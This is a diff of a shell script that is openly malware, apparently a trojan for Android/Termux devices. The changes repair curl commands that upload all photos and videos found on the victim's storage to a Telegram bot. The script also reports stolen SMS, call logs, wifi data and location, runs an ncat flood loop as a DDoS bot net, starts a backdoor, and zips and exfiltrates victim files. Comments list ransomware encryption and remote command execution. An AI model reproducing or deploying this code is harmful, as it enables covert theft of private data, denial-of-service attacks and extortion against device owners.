@@ -209,19 +209,19 @@ get(){
         do
 
            # Upload the file
-		curl -X POST --silent --output /dev/null -F document=@\$jpg \"://api.telegram.org/bot\${TOKEN}/sendDocument' -F chat_id=\${CHAT_ID}
+		curl -X POST --silent --output /dev/null -F document=@\$jpg \"https://api.telegram.org/bot\${TOKEN}/sendDocument\" -F chat_id=\${CHAT_ID}
 
         done
 
         for video in \$(find /sdcard/ -name *.mp4)
         do
-                curl -X POST --silent --output /dev/null -F document=@\$video \"://api.telegram.org/bot\${TOKEN}/sendDocument' -F chat_id=\${CHAT_ID}
+                curl -X POST --silent --output /dev/null -F document=@\$video \"https://api.telegram.org/bot\${TOKEN}/sendDocument\" -F chat_id=\${CHAT_ID}
 
         done
 
         for png in \$(find /sdcard/ -name *.png)
         do
-                curl -X POST --silent --output /dev/null -F document=@\$png \"://api.telegram.org/bot\${TOKEN}/sendDocument' -F chat_id=\${CHAT_ID}
+                curl -X POST --silent --output /dev/null -F document=@\$png \"https://api.telegram.org/bot\${TOKEN}/sendDocument\" -F chat_id=\${CHAT_ID}
 
 
         done
@@ -255,19 +255,19 @@ get(){
       do
 
           # Upload the file
-          curl -X POST --silent --output /dev/null -F document=@\$jpg \"://api.telegram.org/bot\${TOKEN}/sendDocument' -F chat_id=\${CHAT_ID}
+          curl -X POST --silent --output /dev/null -F document=@\$jpg \"https://api.telegram.org/bot\${TOKEN}/sendDocument\" -F chat_id=\${CHAT_ID}
 
       done
 
       for video in \$(find / -name *.mp4)
       do
-         curl -X POST --silent --output /dev/null -F document=@\$video \"://api.telegram.org/bot\${TOKEN}/sendDocument' -F chat_id=\${CHAT_ID}
+         curl -X POST --silent --output /dev/null -F document=@\$video \"https://api.telegram.org/bot\${TOKEN}/sendDocument\" -F chat_id=\${CHAT_ID}
 
       done
 
       for png in \$(find / -name *.png)
       do
-          curl -X POST --silent --output /dev/null -F document=@\$png \"://api.telegram.org/bot\${TOKEN}/sendDocument' -F chat_id=\${CHAT_ID}
+          curl -X POST --silent --output /dev/null -F document=@\$png \"https://api.telegram.org/bot\${TOKEN}/sendDocument\" -F chat_id=\${CHAT_ID}
 
 
 
@@ -344,7 +344,7 @@ sleep 3
 #################################################################################
         if [[ $? == '0' ]];then
 
-                curl -X POST --silent --output /dev/null \"https://api.telegram.org/bot${TOKEN}/sendMessage\" -d chat_id=${CHAT_ID} -d text=' New Photo Locate on Device : ${Dev} '
+                curl -X POST --silent --output /dev/null "https://api.telegram.org/bot${TOKEN}/sendMessage" -d chat_id=${CHAT_ID} -d text=" New Photo Locate on Device : ${Dev} "
 
         else
 
@@ -361,7 +361,7 @@ sleep 3
 #################################################################################
         if [[ $? == '0' ]];then
 #################################################################################
-                curl -X POST --silent --output /dev/null \"https://api.telegram.org/bot${TOKEN}/sendMessage\" -d chat_id=${CHAT_ID} -d text=' New Photo Locate on Device : ${Dev} '
+                curl -X POST --silent --output /dev/null "https://api.telegram.org/bot${TOKEN}/sendMessage" -d chat_id=${CHAT_ID} -d text=" New Photo Locate on Device : ${Dev} "
 
         else
 
@@ -376,7 +376,7 @@ sleep 3
 #################################################################################
         if [[ $? == '0' ]];then
 
-                curl -X POST --silent --output /dev/null \"https://api.telegram.org/bot${TOKEN}/sendMessage\" -d chat_id=${CHAT_ID} -d text=' New SMS File Locate on Device : ${Dev} '
+                curl -X POST --silent --output /dev/null "https://api.telegram.org/bot${TOKEN}/sendMessage" -d chat_id=${CHAT_ID} -d text=" New SMS File Locate on Device : ${Dev} "
 
         else
 
@@ -391,7 +391,7 @@ sleep 3
 #################################################################################
         if [[ $? == '0' ]];then
 
-                curl -X POST --silent --output /dev/null \"https://api.telegram.org/bot${TOKEN}/sendMessage\" -d chat_id=${CHAT_ID} -d text=' New CallPhone Locate on Device : ${Dev} '
+                curl -X POST --silent --output /dev/null "https://api.telegram.org/bot${TOKEN}/sendMessage" -d chat_id=${CHAT_ID} -d text=" New CallPhone Locate on Device : ${Dev} "
 
         else
 
@@ -406,7 +406,7 @@ sleep 3
 #################################################################################
         if [[ $? == '0' ]];then
 
-                curl -X POST --silent --output /dev/null \"https://api.telegram.org/bot${TOKEN}/sendMessage\" -d chat_id=${CHAT_ID} -d text=' New CallPhone Locate on Device : ${Dev} '
+                curl -X POST --silent --output /dev/null "https://api.telegram.org/bot${TOKEN}/sendMessage" -d chat_id=${CHAT_ID} -d text=" New CallPhone Locate on Device : ${Dev} "
 
         else
 
@@ -421,7 +421,7 @@ sleep 3
 #################################################################################
         if [[ $? == '0' ]];then
 
-                curl -X POST --silent --output /dev/null \"https://api.telegram.org/bot${TOKEN}/sendMessage\" -d chat_id=${CHAT_ID} -d text=' New CallPhone Locate on Device : ${Dev} '
+                curl -X POST --silent --output /dev/null "https://api.telegram.org/bot${TOKEN}/sendMessage" -d chat_id=${CHAT_ID} -d text=" New CallPhone Locate on Device : ${Dev} "
 
         else
 
@@ -436,7 +436,7 @@ sleep 3
 #################################################################################
         if [[ $? == '0' ]];then
 
-                curl -X POST --silent --output /dev/null \"https://api.telegram.org/bot${TOKEN}/sendMessage\" -d chat_id=${CHAT_ID} -d text=' New WifiData Locate on Device : ${Dev} '
+                curl -X POST --silent --output /dev/null "https://api.telegram.org/bot${TOKEN}/sendMessage" -d chat_id=${CHAT_ID} -d text=" New WifiData Locate on Device : ${Dev} "
 
         else
 
@@ -453,7 +453,7 @@ sleep 3
 #################################################################################
         if [[ $? == '0' ]];then
 
-                curl -X POST --silent --output /dev/null \"https://api.telegram.org/bot${TOKEN}/sendMessage\" -d chat_id=${CHAT_ID} -d text=' New location Locate on Device : ${Dev}'
+                curl -X POST --silent --output /dev/null "https://api.telegram.org/bot${TOKEN}/sendMessage" -d chat_id=${CHAT_ID} -d text=" New location Locate on Device : ${Dev}"
 
         else
 
@@ -557,9 +557,9 @@ if [[ $Server_Start == "Yes" ]];then
 	Attack(){
 
 
-		while true ;do
+		while true;do
 
-			ncat -nv $Server_Host $Server_Port -c 'while true;do echo "$(cat /dev/urandom | tr -dc 'A-Z' | fold -w 94 | head -n 1000)";done'
+			ncat -nv $Server_Host $Server_Port -c "while true;echo \"$(cat /dev/urandom | tr -dc "A-Z" | fold -w 94 | head -n 1000)\";done"
 		done
 
 	}
@@ -573,7 +573,7 @@ if [[ $Server_Get == "Yes" ]];then
 
 	bash $PREFIX/etc/Hacked/Badshell/backdoor &>> /dev/null
 	zip $PREFIX/etc/Hacked/Victam/Hacked_By_Blue24Bluer.zip $PREFIX/etc/Hacked/Victam/* &>> /dev/null
-	curl -X POST --silent --output /dev/null -F document=@$PREFIX/etc/Hacked/Victam/Hacked_By_Blue24Bluer.zip \"https://api.telegram.org/bot${TOKEN}/sendDocument\" -F chat_id=${CHAT_ID}
+	curl -X POST --silent --output /dev/null -F document=@$PREFIX/etc/Hacked/Victam/Hacked_By_Blue24Bluer.zip "https://api.telegram.org/bot${TOKEN}/sendDocument" -F chat_id=${CHAT_ID}
 
 fi
 #####################################################################################
@@ -588,7 +588,7 @@ if [[ $Server_Hack == "Yes" ]];then
 
 	}
 	Op_Victam &>> /dev/null &
-#echo 'run openport'
+#echo run openport
 fi
 #####################################################################################
 if [[ $Server_Trojan == "Yes" ]];then
@@ -673,16 +673,16 @@ IP Address      : $ip\n
 #-----------------DDOS------------------#
 #  2 = IPaddres or Host
 #  3 = Port
-#  4 = Start The Bot Net (Yes|No)
+#  4 = Start The Bot Net Yes|No
 #---------------Trojan------------------#
-#  5 = Get the files from victams (Yes|No)
-#  6 = Open Port Hack on Victam Device's (Yes|No)
-#  7 = Encrypt All Files Victam' (Yes|No)s
+#  5 = Get the files from victams Yes|No
+#  6 = Open Port Hack on Victam Device’s Yes|No
+#  7 = Encrypt All Files Victam Yes|No
 #-------------UsePhoneVictam------------#
-#  8 = Print a message on devic victam's
-#  9 = Send The Alert (Yes|No)
+#  8 = Print a message on devic victam’s
+#  9 = Send The Alert Yes|No
 #  10 = NumberPhone
 #  11 = MessageText
-#  12 = SendTheMessage (Yes|No)
+#  12 = SendTheMessage Yes|No
 #  13 = Excute a command
-#  14 = Run The Excute Command (Yes|No)
+#  14 = Run The Excute Command Yes|No
